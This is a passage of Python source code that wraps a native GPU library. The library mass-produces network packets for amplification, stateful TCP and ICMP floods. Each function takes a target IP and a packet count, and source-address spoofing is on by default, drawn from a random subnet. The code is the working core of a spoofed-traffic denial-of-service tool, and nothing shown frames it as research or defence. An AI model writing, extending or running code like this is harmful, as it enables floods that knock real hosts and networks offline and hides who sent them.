        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_amplification_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_amplification_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_stateful_packets(
    templates_bytes_list,
    count,
    target_ip,
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    seq_list=None,
    ack_list=None,
    state_list=None,
    actual_lengths=None,
    window_sizes=None,
    mss_values=None,
    ttls=None,
    force_global_fallback=False,
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_stateful_packets", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_stateful_packets", stream=stream)
        return _call_legacy(
            "generate_stateful_packets",
            templates_bytes_list,
            count,
            target_ip,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            specific_src_port=specific_src_port,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            seq_list=seq_list,
            ack_list=ack_list,
            state_list=state_list,
            actual_lengths=actual_lengths,
            window_sizes=window_sizes,
            mss_values=mss_values,
            ttls=ttls,
            force_global_fallback=force_global_fallback,
        )

    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None
    flat_ptr, flat_len = _array_ptr(flat, ctypes.POINTER(ctypes.c_uint8))

    seq_arr = _coerce_numeric_array(seq_list, np.uint32, cache_name="stateful:seq")
    ack_arr = _coerce_numeric_array(ack_list, np.uint32, cache_name="stateful:ack")
    state_arr = _coerce_numeric_array(state_list, np.uint8, cache_name="stateful:state")
    lengths_arr = _coerce_numeric_array(actual_lengths, np.uint32, cache_name="stateful:lengths")
    wins_arr = _coerce_numeric_array(window_sizes, np.uint16, cache_name="stateful:wins")
    msss_arr = _coerce_numeric_array(mss_values, np.uint16, cache_name="stateful:mss")
    ttl_arr = _coerce_numeric_array(ttls, np.uint8, cache_name="stateful:ttl")

    seq_ptr, seq_len = _array_ptr(seq_arr, ctypes.POINTER(ctypes.c_uint32))
    ack_ptr, ack_len = _array_ptr(ack_arr, ctypes.POINTER(ctypes.c_uint32))
    state_ptr, state_len = _array_ptr(state_arr, ctypes.POINTER(ctypes.c_uint8))
    lengths_ptr, lengths_len = _array_ptr(lengths_arr, ctypes.POINTER(ctypes.c_uint32))
    wins_ptr, wins_len = _array_ptr(wins_arr, ctypes.POINTER(ctypes.c_uint16))
    msss_ptr, msss_len = _array_ptr(msss_arr, ctypes.POINTER(ctypes.c_uint16))
    ttl_ptr, ttl_len = _array_ptr(ttl_arr, ctypes.POINTER(ctypes.c_uint8))
    h2d_bytes = int(flat_len)
    if seq_arr is not None:
        h2d_bytes += int(seq_arr.nbytes)
    if ack_arr is not None:
        h2d_bytes += int(ack_arr.nbytes)
    if state_arr is not None:
        h2d_bytes += int(state_arr.nbytes)
    if lengths_arr is not None:
        h2d_bytes += int(lengths_arr.nbytes)
    if wins_arr is not None:
        h2d_bytes += int(wins_arr.nbytes)
    if msss_arr is not None:
        h2d_bytes += int(msss_arr.nbytes)
    if ttl_arr is not None:
        h2d_bytes += int(ttl_arr.nbytes)
    _native_track_h2d_copy(h2d_bytes)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_stateful_packets(
        flat_ptr,
        ctypes.c_size_t(flat_len),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        seq_ptr,
        ctypes.c_size_t(seq_len),
        ack_ptr,
        ctypes.c_size_t(ack_len),
        state_ptr,
        ctypes.c_size_t(state_len),
        lengths_ptr,
        ctypes.c_size_t(lengths_len),
        wins_ptr,
        ctypes.c_size_t(wins_len),
        msss_ptr,
        ctypes.c_size_t(msss_len),
        ttl_ptr,
        ctypes.c_size_t(ttl_len),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_stateful_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_stateful_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def benchmark_template_generation_paths(*args, **kwargs):
    return _call_legacy("benchmark_template_generation_paths", *args, **kwargs)


def generate_icmp_packets(
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    icmp_type=8,
    icmp_code=0,
    payload_size=56,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_icmp_packets", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_icmp_packets", stream=stream)
        return _call_legacy(
            "generate_icmp_packets",
            count,
            target_ip,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            icmp_type=icmp_type,
            icmp_code=icmp_code,
            payload_size=payload_size,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_icmp_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(icmp_type)),
        ctypes.c_int64(int(icmp_code)),
        ctypes.c_int64(int(payload_size)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_icmp_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_icmp_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def get_generation_telemetry() -> dict:
    legacy = _call_legacy("get_generation_telemetry")
    out = dict(legacy or {})
    native = _native_telemetry_snapshot()
    out.update(native)
    out["gpu_native_copy_metrics_estimated"] = 1
    out["gpu_template_h2d_copy_count"] = int(out.get("gpu_template_h2d_copy_count", 0) or 0) + int(
        native.get("gpu_native_h2d_copy_count", 0) or 0
    )
    out["gpu_template_h2d_copy_bytes"] = int(out.get("gpu_template_h2d_copy_bytes", 0) or 0) + int(
        native.get("gpu_native_h2d_copy_bytes", 0) or 0
    )
    return out


def reset_generation_telemetry() -> None:
    _call_legacy("reset_generation_telemetry")
    _native_telemetry_reset()


def clear_generation_caches() -> None:
    _call_legacy("clear_generation_caches")


def get_memory_pool():
    return _call_legacy("get_memory_pool")


def get_pinned_host_pool():
    return _call_legacy("get_pinned_host_pool")


def configure_pinned_host_pool(*args, **kwargs):
    return _call_legacy("configure_pinned_host_pool", *args, **kwargs)


def copy_gpu_to_host_pinned(gpu_arr, *args, **kwargs):
    if isinstance(gpu_arr, memoryview):
        return gpu_arr if gpu_arr.itemsize == 1 else gpu_arr.cast("B")
    if isinstance(gpu_arr, np.ndarray):
        if gpu_arr.dtype == np.uint8 and gpu_arr.ndim == 1 and gpu_arr.flags.c_contiguous:
            return gpu_arr
        flat = np.ravel(gpu_arr)
        if flat.dtype != np.uint8:
            if flat.dtype.itemsize == 1:
                flat = flat.view(np.uint8)
            else:
                flat = flat.astype(np.uint8, copy=False)
        if flat.flags.c_contiguous:
            return flat
        return np.ascontiguousarray(flat)
    if isinstance(gpu_arr, (bytes, bytearray)):
        return gpu_arr
    return _call_legacy("copy_gpu_to_host_pinned", gpu_arr, *args, **kwargs)


def get_pool_telemetry() -> dict:
    return _call_legacy("get_pool_telemetry")


def safe_kernel_launch(*args, **kwargs):
    return _call_legacy("safe_kernel_launch", *args, **kwargs)


def check_gpu_available():
    return _call_legacy("check_gpu_available")


def get_gpu_info() -> dict:
    return _call_legacy("get_gpu_info")


def is_gpu_available() -> bool:
    return bool(_call_legacy("is_gpu_available"))
